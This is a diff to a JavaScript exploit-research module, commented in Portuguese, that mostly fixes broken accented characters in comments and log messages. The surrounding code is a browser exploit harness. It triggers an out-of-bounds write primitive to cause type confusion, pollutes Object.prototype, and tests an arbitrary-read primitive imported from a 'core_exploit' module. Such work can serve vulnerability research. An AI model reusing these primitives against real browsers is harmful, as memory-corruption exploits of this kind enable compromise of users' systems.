@@ -6,8 +6,8 @@ import {
     triggerOOB_primitive, 
     clearOOBEnvironment,
     arb_read,  // Do core_exploit.mjs (v31)
-    // arb_write, // NÃ£o usado diretamente neste teste R23
-    oob_write_absolute // Para a escrita crÃ­tica da Fase 1 TC
+    // arb_write, // Não usado diretamente neste teste R23
+    oob_write_absolute // Para a escrita crítica da Fase 1 TC
     // attemptAddrofUsingCoreHeisenbug // Removido, pois vamos testar arb_read diretamente
 } from '../core_exploit.mjs'; // Assumindo core_exploit.mjs (v31)
 
@@ -19,7 +19,7 @@ const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF];
 
 const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
 const PROBE_CALL_LIMIT_V82 = 10; 
-const ARB_READ_TEST_ADDRESS = new AdvancedInt64(0x0, 0x1000); // EndereÃ§o de teste para arb_read
+const ARB_READ_TEST_ADDRESS = new AdvancedInt64(0x0, 0x1000); // Endereço de teste para arb_read
 
 export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23() { 
     const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R23`;
@@ -46,7 +46,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
         let iteration_final_tc_details_from_probe = null; 
         let iteration_tc_first_detection_done = false; 
 
-        // Os objetos de leak nÃ£o sÃ£o o foco do addrof nesta versÃ£o, mas sÃ£o usados pela sonda TC
+        // Os objetos de leak não são o foco do addrof nesta versão, mas são usados pela sonda TC
         const current_object_to_leak_A = { marker_A_R23: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
         const current_object_to_leak_B = { marker_B_R23: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
         
@@ -66,8 +66,8 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
         let heisenbugConfirmedThisIter = false;
         
         try { 
-            // Fase 1: DetecÃ§Ã£o da Type Confusion
-            logS3(`  --- Fase 1 (R23): DetecÃ§Ã£o de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
+            // Fase 1: Detecção da Type Confusion
+            logS3(`  --- Fase 1 (R23): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
             await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
             oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
             await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
@@ -83,27 +83,27 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
                     if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                 }else{logS3(` TC Probe R23: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
             }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
-            logS3(`  --- Fase 1 (R23) ConcluÃ­da. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
+            logS3(`  --- Fase 1 (R23) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
             await PAUSE_S3(100);
 
             // Fase 2: Teste de arb_read
             logS3(`  --- Fase 2 (R23): Teste de arb_read ---`, "subtest", FNAME_CURRENT_ITERATION);
-            if (heisenbugConfirmedThisIter) { // SÃ³ tenta arb_read se a TC principal (setup) funcionou
+            if (heisenbugConfirmedThisIter) { // Só tenta arb_read se a TC principal (setup) funcionou
                 try {
                     logS3(`  ArbRead Test: Chamando triggerOOB_primitive para arb_read...`, "info", FNAME_CURRENT_ITERATION);
                     await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-ArbReadSetup` });
                     if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-ArbReadSetup`)) {
-                        throw new Error("Ambiente OOB nÃ£o pÃ´de ser re-inicializado para teste de arb_read.");
+                        throw new Error("Ambiente OOB não pôde ser re-inicializado para teste de arb_read.");
                     }
                     logS3(`  ArbRead Test: Ambiente OOB pronto. Tentando ler de ${ARB_READ_TEST_ADDRESS.toString(true)}...`, "info", FNAME_CURRENT_ITERATION);
                     
-                    const read_value = await arb_read(ARB_READ_TEST_ADDRESS, 8); // LÃª 8 bytes
+                    const read_value = await arb_read(ARB_READ_TEST_ADDRESS, 8); // Lê 8 bytes
                     
                     iter_arb_read_test_result.address_read = ARB_READ_TEST_ADDRESS.toString(true);
                     if (isAdvancedInt64Object(read_value)) {
                         iter_arb_read_test_result.value_read = read_value.toString(true);
                         logS3(`  ArbRead Test: arb_read(${ARB_READ_TEST_ADDRESS.toString(true)}, 8) -> ${read_value.toString(true)}`, "leak", FNAME_CURRENT_ITERATION);
-                        iter_arb_read_test_result.success = true; // Sucesso na operaÃ§Ã£o de leitura
+                        iter_arb_read_test_result.success = true; // Sucesso na operação de leitura
                         iter_arb_read_test_result.msg = `arb_read executado com sucesso. Valor lido: ${read_value.toString(true)}.`;
                     } else {
                         iter_arb_read_test_result.value_read = String(read_value);
@@ -119,7 +119,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
                 iter_arb_read_test_result.msg = "arb_read test: Pulado porque a TC da Fase 1 falhou.";
                 logS3(`  ArbRead Test: ${iter_arb_read_test_result.msg}`, "warn", FNAME_CURRENT_ITERATION);
             }
-            logS3(`  --- Fase 2 (R23) ConcluÃ­da. arb_read Test Sucesso Operacional: ${iter_arb_read_test_result.success} ---`, "subtest");
+            logS3(`  --- Fase 2 (R23) Concluída. arb_read Test Sucesso Operacional: ${iter_arb_read_test_result.success} ---`, "subtest");
 
         }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer;}finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear`});}
 
@@ -134,9 +134,9 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
         };
         iteration_results_summary.push(current_iter_summary);
         
-        // LÃ³gica ATUALIZADA para best_result_for_runner
+        // Lógica ATUALIZADA para best_result_for_runner
         let tc_phase1_this_iter_success = heisenbugConfirmedThisIter;
-        // Para R23, o "sucesso" principal Ã© a TC da Fase 1. O arb_read Ã© apenas um teste.
+        // Para R23, o "sucesso" principal é a TC da Fase 1. O arb_read é apenas um teste.
         if (tc_phase1_this_iter_success) {
             if (!best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe || !best_result_for_runner.oob_value_used) {
                  best_result_for_runner = {
@@ -149,7 +149,7 @@ export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R23()
                 };
             }
         } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
-             best_result_for_runner = { /* ... preenche com os dados da Ãºltima iteraÃ§Ã£o ... */ 
+             best_result_for_runner = { /* ... preenche com os dados da última iteração ... */ 
                 errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : best_result_for_runner.errorOccurred,
                 tc_probe_details: iteration_final_tc_details_from_probe ? JSON.parse(JSON.stringify(iteration_final_tc_details_from_probe)) : null, 
                 stringifyResult: iter_stringify_output_parsed,
